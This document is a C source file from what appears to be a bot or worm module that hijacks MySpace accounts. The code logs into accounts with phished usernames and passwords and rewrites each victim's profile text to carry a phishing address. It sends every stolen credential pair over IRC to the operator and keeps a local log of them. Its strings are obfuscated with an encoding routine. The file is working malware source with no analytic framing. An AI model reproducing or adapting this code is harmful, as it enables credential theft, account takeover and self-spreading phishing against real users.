#include "myspace.h"
#include "mylib.h"
#include "irc.h"

#include <wininet.h>
#include <string.h>
#include <stdio.h>

unsigned long 
MySpaceSendCallback
(struct myspace_d *myspace) {
    char buf[0x40];
    myspace->stat=MySpaceEdit(myspace);
    sprintf(buf,
        riddle_enc("xBÄz=jñêç~ÄÇ=iåÑÜã=Bê=EBêWBêF"), // [%c] Myspace Login %s (%s:%s)
        myspace->stat ? '+' : '-',
        myspace->stat ? riddle_enc("==_Åooqqpqp") : riddle_enc("<Niqtml"), // 11Succeeded, 4Failed
        myspace->username,myspace->password);
    IrcSend(buf);
    return(myspace->stat);
}

/*     
void
MySpaceGetLogData
(struct myspace_d *myspace) {
    FILE *fp;
    char buf[0x200], *tmp;
    if(strcmp(GetLocalIpAddress(),GetPhishingIpAddress()))
       GetPhishingLogins();
    if(fp=fopen("hlog.dat","r") == NULL) return;
    fp=fopen("hlog.dat","r");
    while(fgets(buf,sizeof(buf),fp)) {
        if(CheckLoginRepeat(buf)) {
           if(tmp=strchr(buf,':')) {
             tmp[0x0]='\0';
             strcpy(myspace->username,buf);
             tmp[0x0]=':';
             tmp += 0x1;
             strcpy(myspace->password,tmp);
             MySpaceSendCallback(myspace);
           }
        }
    }
    fclose(fp);
}
*/

int 
MySpaceEdit
(struct myspace_d *myspace) {
    char buf[0x15F90],lpRequest[0x800],tmp[0x800];
    GetWebPage(buf,sizeof(buf),riddle_enc("ÜÜÜ=|àÇprt=r~|"),
         riddle_enc("rwmnÅ7lov"),riddle_enc("JHW"),"",0x0); // www.myspace.com, index.cfm, GET
    LogToFile("tmp.html",buf,"w");
    sprintf(lpRequest,
         "__VIEWSTATE=%s&"
         "ctl00$Main$SplashDisplay$ctl00$Email_Textbox=%s&"
         "ctl00$Main$SplashDisplay$ctl00$Password_Textbox=%s",
         GetHashValue(buf,"__VIEWSTATE",'"',0x25),myspace->username,myspace->password);
    GetWebPage(buf,sizeof(buf),riddle_enc("ÖwuáÑw@ãÖÇsuw@uÅ"),
         riddle_enc("ãêÜáöPÖàèaàóïáÉÖñãëê_éëâãêPíîëÖáïï"),riddle_enc("TSWX"),lpRequest,0x0); 
         // secure.myspace.com, index.cfm?fuseaction=login.process, POST
    LogToFile("afterlogin.html",buf,"w");
    if(strstr(buf,riddle_enc("zêñAnñîïAcÜAmêààÜÖNjèAïêAÖêAuâÇïB"))) return(0x0); // You Must Be Logged-In to do That!
    strcpy(myspace->url,GetHashValue(buf,riddle_enc("áâÜ}ÄÉ||{ÄãEÑêäáxz|EzÜÑ"),'"',0x18)); // profileedit.myspace.com
    GetWebPage(buf,sizeof(buf),riddle_enc("áâÜ}ÄÉ||{ÄãEÑêäáxz|EzÜÑ"),
         myspace->url,riddle_enc("JHW"),"",0x0); // profileedit.myspace.com, GET
    sprintf(lpRequest,
         "__EVENTTARGET=&__EVENTARGUMENT=&"
         "__VIEWSTATE=%s&ctl00$ctl00$cpMain$ProfileEditContent$editInterests$hash=%s&"
         "ctl00$ctl00$cpMain$ProfileEditContent$editInterests$SaveTop=Save All Changes&"
         "ctl00$ctl00$cpMain$ProfileEditContent$editInterests$AboutMeTextBox=%s",
         GetHashValue(buf,"__VIEWSTATE",'"',0x25),GetHashValue(buf,"_hash",'"',0xE),myspace->editdata);
    strcpy(tmp,lpRequest);
    GetWebPage(buf,sizeof(buf),riddle_enc("áâÜ}ÄÉ||{ÄãEÑêäáxz|EzÜÑ"),
         myspace->url,riddle_enc("JHW"),"",0x0); // profileedit.myspace.com, GET
    GetWebPage(buf,sizeof(buf),riddle_enc("áâÜ}ÄÉ||{ÄãEÑêäáxz|EzÜÑ"),
         GetHashValue(buf,"name=\"aspnetForm\"",'"',0x29),riddle_enc("TSWX"),tmp,0x1); // profileedit.myspace.com, POST
    GetWebPage(NULL,0x0,"collect.myspace.com","index.cfm?fuseaction=signout","GET","",0x1);
    LogToFile("logoff.html",buf,"w");
    return(0x1);
}

void 
MySpaceMain
(struct myspace_param_d *param) {
    char buf[0x80];
    struct myspace_d myspace;
    sprintf(myspace.editdata,param->lpEditData,GetPhishingIpAddress());
    if(param->bRawData == 0x1) {
       strcpy(myspace.username,GetHashValue(param->lpLoginData,"Email_Textbox=",'&',14));
       strcpy(myspace.password,GetHashValue(param->lpLoginData,"Password_Textbox=",'&',0x11));
       sprintf(buf,riddle_enc("*x?*x"),myspace.username,myspace.password); // %s:%s
       if(MySpaceSendCallback(&myspace)) 
          LogToFile(riddle_enc("ptwo6li|"),buf,"a"); // hlog.dat
    } 
    ExitThread(0x0);
    //else MySpaceGetLogData(&myspace);
}
